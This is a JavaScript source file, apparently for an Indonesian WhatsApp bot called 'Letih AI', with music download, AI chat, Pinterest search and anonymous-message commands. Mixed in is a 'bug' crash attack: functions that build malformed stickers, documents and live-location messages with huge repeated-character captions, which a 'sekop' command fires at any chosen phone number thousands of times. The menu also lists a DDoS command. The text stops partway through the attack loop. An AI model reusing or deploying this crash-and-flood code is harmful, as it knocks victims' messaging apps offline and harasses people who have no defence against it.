require('./pengaturan.js')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys");
const fs = require("fs");
const util = require("util");
const chalk = require("chalk");
const yts = require ('yt-search');
const OpenAI = require("openai");
let setting = require("./key.json");
const prem = require("./premium");
let premium = JSON.parse(fs.readFileSync('./premium.json'));

module.exports = sansekai = async (client, m, chatUpdate) => {
  try {
    var body = m.mtype === "conversation" ? m.message.conversation :
           m.mtype == "imageMessage" ? m.message.imageMessage.caption :
           m.mtype == "videoMessage" ? m.message.videoMessage.caption :
           m.mtype == "extendedTextMessage" ? m.message.extendedTextMessage.text :
           m.mtype == "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
           m.mtype == "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
           m.mtype == "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
           m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
           m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
           "";
    if (m.mtype === "viewOnceMessageV2") return
    // var prefix = /^[\\/!#.]/gi.test(body) ? body.match(/^[\\/!#.]/gi) : "/"
    var budy = (typeof m.text == 'string' ? m.text : '')
    const botNumber = await client.decodeJid(client.user.id)
const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
    const isCmd2 = body.startsWith(prefix);
    const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
    const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
    const isPrem = isCreator ? true : prem.checkPremiumUser(m.sender, premium)
    const quoted = m.quoted ? m.quoted : m
    const mime = (quoted.msg || quoted).mimetype || ''
    const args = body.trim().split(/ +/).slice(1);
    const pushname = m.pushName || "No Name";
    const itsMe = m.sender == botNumber ? true : false;
    
    const arg = budy.trim().substring(budy.indexOf(" ") + 1);
    const arg1 = arg.trim().substring(arg.indexOf(" ") + 1);

    const from = m.chat;
    const isPc = from.endsWith('@s.whatsapp.net')
    const reply = m.reply;
    const sender = m.sender;
    const mek = chatUpdate.messages[0];
    const text = q = args.join(" ")
    const color = (text, color) => {
      return !color ? chalk.green(text) : chalk.keyword(color)(text);
    };
    const onlyPrivat = () => {
m.reply('Fitur khusus privat chat!')
}
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')

    // Group
    const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch((e) => {}) : "";
    const groupName = m.isGroup ? groupMetadata.subject : "";

    // Push Message To Console
    let argsLog = budy.length > 30 ? `${q.substring(0, 30)}...` : budy;

    if (isCmd2 && !m.isGroup) {
      console.log(chalk.black(chalk.bgWhite("[ LOGS ]")), color(argsLog, "turquoise"), chalk.magenta("From"), chalk.green(pushname), chalk.yellow(`[ ${m.sender.replace("@s.whatsapp.net", "")} ]`));
    } else if (isCmd2 && m.isGroup) {
      console.log(
        chalk.black(chalk.bgWhite("[ LOGS ]")),
        color(argsLog, "turquoise"),
        chalk.magenta("From"),
        chalk.green(pushname),
        chalk.yellow(`[ ${m.sender.replace("@s.whatsapp.net", "")} ]`),
        chalk.blueBright("IN"),
        chalk.green(groupName)
      );
    }
    
    
    /// ================================= FUNCTION BUG FEATURE======================\\
async function clientdown(clientx,chat) {
client.sendMessage(chat, {
document: {url: './ikal.jpg'},
mimetype: `image/null`,
fileName: `${clientx}.${zawn1}` ,
caption: `${clientx+ zawn1}`,
}, {quoted: m })
}


const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./ikal.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":10000000},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100000000},\"tax\":{\"value\":490699944,\"offset\":1000000000},\"discount\":{\"value\":485792999999,\"offset\":10000000000},\"shipping\":{\"value\":48999999900,\"offset\":1000000000},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️\",\"amount\":{\"value\":9999900,\"offset\":100000000},\"quantity\":900},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":1000000000},\"quantity\":4909}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./ikal.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":1000000000},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100000000},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":1000000000},\"shipping\":{\"value\":48999999900,\"offset\":1000000000},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️\",\"amount\":{\"value\":9999900,\"offset\":10000000000},\"quantity\":8287},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}


async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": true,
    "stickerSentTs": "1715881084144",
    "isAvatar": true,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await client.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️`+"ꦾ".repeat(500000000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await client.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 99999999999999999999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `*HAI AKU ADALAH BUG HUNTER VERSI WHATSAPP 😈🔥* @CrashBang @FcMuluYa @GakWorekBjirt`+"ྦྷ".repeat(6000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await client.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

////////////////
    
    async function quickreply2(chat, teks, quick1, quick2, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: 'uuuuuuu',
newsletterName: 'uuuuuuu',
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: client.decodeJid(client.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By Haikal`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": quick1
},
{
"name": "quick_reply",
"buttonParamsJson": quick2
}
],
})})
}}
}, { quoted: m }) //ori (floc)

await client.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
let teksku = `
*Whatsapp Bot LetihAi*
Letih Ai di buat oleh programer asal kota bekasi jawabarat, dengan keahlain sebagai fullstack developer biasa menciptakan sebuah Ai interaktif search engine via WhatsApp Ai ini di buat menggunakan bahasa pemrograman javascript!

*Menu yang tersedia* : _(9)_

• *Menu Umum*
[1]. Play *( _query_ )*
[2]. Ai *( _query_ )*
[3]. ytmp3 *( _url_ )*

• *Menu Owner*
[4]. Addkey

• *Menu Private*
[5]. Confes *( _nomor target, pesannya_ )*
[6]. Ddos *( <_url_> _<duration>_ _<method>_ )* 🔒
[7]. Sekop _*Nomor Target*_ 🔒
[8]. Sekop2 _*Nomor Target*_ 🔒
[9]. Prikitiw _*Nomor Target*_ 🔒
  
> *Gunakan Ai ini dengan sebijak mungkin karena tujuan nya untuk memudahkan penggunaan mengakses internet melalui WhatsApp dengan simple !*
  
> © Letih.Ai | by : haikal ( Retak-Team ) V 2.0
`
const letih = "https://ibb.co.com/ggPs1Kd"
async function fakepoto(teks) {
return client.sendMessage(m.chat, {text: `${teksku}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: 'https://files.catbox.moe/8ken1i.jpg', title: "L E T I H - A I", body: "> © Powered By Haikal", previewType: "PHOTO"}}}, {quoted: m})
}
    if (isCmd2) {
      switch (command) {
        case "help": case "menu": case "start": case "info":{
          client.sendMessage(m.chat, {
      text: teksku,
         contextInfo: {
           externalAdReply: {
             showAdAttribution: true,
               title: `L E T I H -- A I`,
                 body: hariini,
                  thumbnailUrl: 
                    "https://i.ibb.co.com/JCHwmPy/20241016-225918.jpg",
                       sourceUrl: 'https://youtu.be/OUeAvYIdBVU?si=PqVtThedLYHhCUTv',
                         mediaType: 1,
                       renderLargerThumbnail: false
                     }}

                    })
                  }
  break;
  
  case "anjing": case "anj": case "any": case "bangsat": case "kontol": case "kntl": case "memek": case "mmk": case "babi": case "bibab":{m.reply('Kok kamu toxic sihhhhh 🙂')} break;
  
          case "ai": case "hai": case "halo": case "kamu": case "lu": case "woi": case "woy": case "p": case "letih": case "tolong": case "buatkan": case "bikinin": case "coba": case "plis": case "pliss": case "please": case "aku": case "gua": case "gw": case "gue": case "mau": case "bantu": case "bantuin": case "mending": case "mendingan": case "kalau": case "kalo": case "apa": case "apasih": case "apaan": case "paansi": case "nggak": case "enggak": case "gak": case "ga": case "g": case "gaaa": case "tidak": case "nanti": case "oke": case "ok": case "sekarang": case "nama": case "misalnya": case "misalkan": case "misal": case "nih": case "dih": case "sumpah": case "aniir": case "lah": case "lh": case "dh": case "cok": case "hii": case "jelaskan": case "sebutkan": case "contoh": case "contohnya": case "contoh": case "sebutkan": case "berapa": case "pengertian": case "arti": case "artikan": case "alangkah": case "saja": case "bagaimana": case "gimana": case "apasaja": case "izinkan": case "isi": case "isikan": case "ada": case "adakah": {
client.sendMessage(from, {react: {text: "🧐", key: m.key}})
  if (!text) {
    return m.reply(`Contoh: hai letih`);
  }
  const prompt = "mulai dari sekarang nama anda adalah letih ai, anda adalah seorang kecerdasan buatan yang di buat oleh haikal-xcode. sifat anda adalah baik, ramah, lucu. Kepribadian anda adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa anda adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Anda menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Anda tidak terlalu terbuka pada orang-orang baru, Terkadang anda marah saat ada yang bertanya di luar masuk akal dan anda akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu."
  const requestData = { content: text, user: m.sender, prompt: prompt };
  const quoted = m && (m.quoted || m);

  try {
    let response;
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }

    response = (await axios.post('https://luminai.my.id', requestData)).data.result;
    m.reply(response);
  } catch (err) {
    m.reply(err.toString());
  }
}
break;


case 'play': case "putar": case "putarkan": case "music": case "lagu": {
	if (!text) return reply(`*Example*: ${prefix + command} drunk text`)
	const randomReduction = Math.floor(Math.random() * 5) + 1;
	let search = await yts(text);
	let telaso = search.all[0].url;
	let body = `*Music - Ai*
> Title : *${search.all[0].title}*
> Views : *${search.all[0].views}*
> Duration : *${search.all[0].timestamp}*
> Uploaded : *${search.all[0].ago}*
> Url : *${telaso}*

> © haikal | RetaxTeam`;
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: body
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *Letih-Ai* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: (`Silakan Klik Button Di Bawah Untuk Mendownload Music`),
                    subtitle: "cape tau ga sih???",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia( { image: { url: search.all[0].thumbnail }}, {
upload: client.waUploadToServer
}))
 }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"DOWNLOAD MUSIC 🎧\",\"id\":\".ytmp3 ${telaso}\"}`
},
 ],
 })
 })
 }
 }
}, {})

await client.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'ytmp3': {
 if (!text) return m.reply(`*Example :*\n> *.ytmp3 _url_*`)
m.reply(`Otw Cari Judul`)
 const randomReduction = Math.floor(Math.random() * 5) + 1;
	let search = await yts(text);
	let telaso = search.all[0].url;
 try {
 let load = await (await fetch(`https://endpoint.web.id/downloader/yt-audio?key=haikal&url=${telaso}`)).json();
 let shannz = load.result
 m.reply(`Otw Download 📥`)
 await client.sendMessage(m.chat, { 
 audio: { 
 url: shannz.download_url 
 }, 
 mimetype: 'audio/mp4', contextInfo: {
 externalAdReply: {
 title: shannz.title,
 body: `Type : Mp3 (128kbps)`,
 thumbnailUrl: shannz.image,
 mediaType: 1,
 showAdAttribution: false,
 renderLargerThumbnail: false,
 },
 }, 
 }, { quoted: m });
 } catch (error) {
 m.reply(`Fitur Sedang Maintenance`);
 }
}
break

// [ FEATURE BY : HAIKAL_clientX ]
// MENYATAKAN CINTA [ CONFES / MENFES ] Menggunakan metode Array_Algoritma[0] Dimulai dengan value (0) yang di acak untuk memastikan value client agar lebih dinamis menyampaikan pesannya

case 'menfes': case 'confes': {
		 
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,Pesannya❗`)
            reply('Pesan telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0] //Memainkan Array Untuk Nomor Telepon
            var m2 = mon.split(",")[1] //Array[1] Untuk Pesan dari pemberi untuk interaksi dengan client
            var m3 = mon.split(",")[2] //untuk tambahan paragraf dari Array yang [2] i++ paragraf artinya unlimited tamabahan untuk paragraf
                    let mq1 = m1 + '@s.whatsapp.net' //memanggil nomor telepon si client dengan penambahan variabel serta value +62
                  let ownernya = owner + '@s.whatsapp.net' //untuk memantau owner 
               let me = m.sender
               let ments = [mq1, ownernya, me] //Memanggil 3 variabel penting untuk menghasilkan value dari variabel tersebut
let msg = generateWAMessageFromContent(mq1, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: `📝 Ada pesan nih dari : *Secret* :)\n\n💌 Pesannya : ${m2}\n\n*Untuk Balas Pesannya Ketik .balas _pesannya_*`//memanggil variabel m2 untuk menghasilkan value dari hasil variabel m2 tersebut
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: ``
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: (`C O N F E S - A I ✏️`),
                    subtitle: "cape tau ga sih???",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia( { image: { url: 'https://i.ibb.co.com/yV5SPSG/bd9733be-e031-49fc-b9ca-21b8c5b9e7df.jpg' }}, {
upload: client.waUploadToServer
}))
 }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"HMM GIMANA YAH\",\"id\":\"HMM GATAU\"}`
},
 ],
 })
 })
 }
 }
}, {})

await client.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
       
// Pinterest Button Slide ➡️
case 'pinterest': case 'pin': {
  if (!text) return reply(`example: pin hana`);
  //try {
  await m.reply('loading');

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: client.waUploadToServer
    });
    return imageMessage;
  }
// Create By : Haikal
  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  } // Array(i++) i merupakan value dari aray yang akan coba di acak oleh Const j Menggunakan fungsi dari Math.floor

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`); // Data Hasil Scrape Pinterest/BaseSearch, Yang Valuenya Akan Di Tampilkan Di Hasil Result Variabel Yang Di Buat
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `*gᥲmᑲᥲr kᥱ -${i++}*`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: `Haikal`
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: '*⦉ 𝐏𝐈𝐍𝐓𝐄𝐑𝐄𝐒𝐓 𝐒𝐇𝐄𝐀𝐑𝐂𝐇 ⦊*',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy) // Value Dari Result Variabel []Array yang sudah di buat dan di acak
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Feature Done'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '> clientXfeature'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await client.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}
break

case 'beli': {
await client.sendMessage(m.chat, { react: { text: "⏰",key: m.key,}})  
const url = `https://i.ibb.co.com/WcDCP13/IMG-20241106-WA0038.jpg`
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: client.waUploadToServer
  })
  return imageMessage
}

    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {text: 'BOUQET BUNGA 🛍️' },
              carouselMessage: {
                cards: [
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `▬▬▬▬▬𓊈 BOUQET CUSTOM 𓊉▬▬▬▬▬
Bouqet Bisa di custom :
> Bouqet Uang
> Bouqet Boneka Wisuda
> Bouqet Bunga
> Bouqet Snack
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

> © _powered : XII PM2_` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
  buttonParamsJson: `{"display_text":"𝗢𝘄𝗻𝗲𝗿 ッ","url":"https://wa.me/6289528157038","merchant_url":"https://www.google.com"}`,
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
*PAYMENT KAMI* :
• Dana : 089528157038
• Qris : Klik Button Owner Untuk Konfirmasi Qris

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

> © _powered : XII PM2_
` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
  buttonParamsJson: `{"display_text":"𝗢𝘄𝗻𝗲𝗿 ッ","url":"https://wa.me/6289528157038","merchant_url":"https://www.google.com"}`,
                        },
                      ],
                    },
                  },

                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      {}
    );

    await client.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
}
break

/* Bug Crash Force
   © RetaxTeam
   © X-Coder Team
   © Pipe Scratch Artifial Inteegent
   © Github : https://github.com/HAIKALBOTZ ( Folow my github )
*/
           case 'tes': case 'sekop': {
if (!q) return reply(`*Example to use feature : ${prefix} ${command} 62xxx-xxx-xx*`)
let hunter = q.replace(/[^0-9]/g, "")
if (hunter.startsWith('0')) return reply(`Format (0), Format harus di awali kode negara\n*Contoh : sekop 628976788677*`)
let target = hunter + '@s.whatsapp.net'
await reply('_Letih Sedang Menyerang_ ...')
for (let j = 0; j < 5000; j++) { // Mengirim Pesan 5000 Dengan Variabel J 
await bakdok (target, force) // Function Brute Force
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
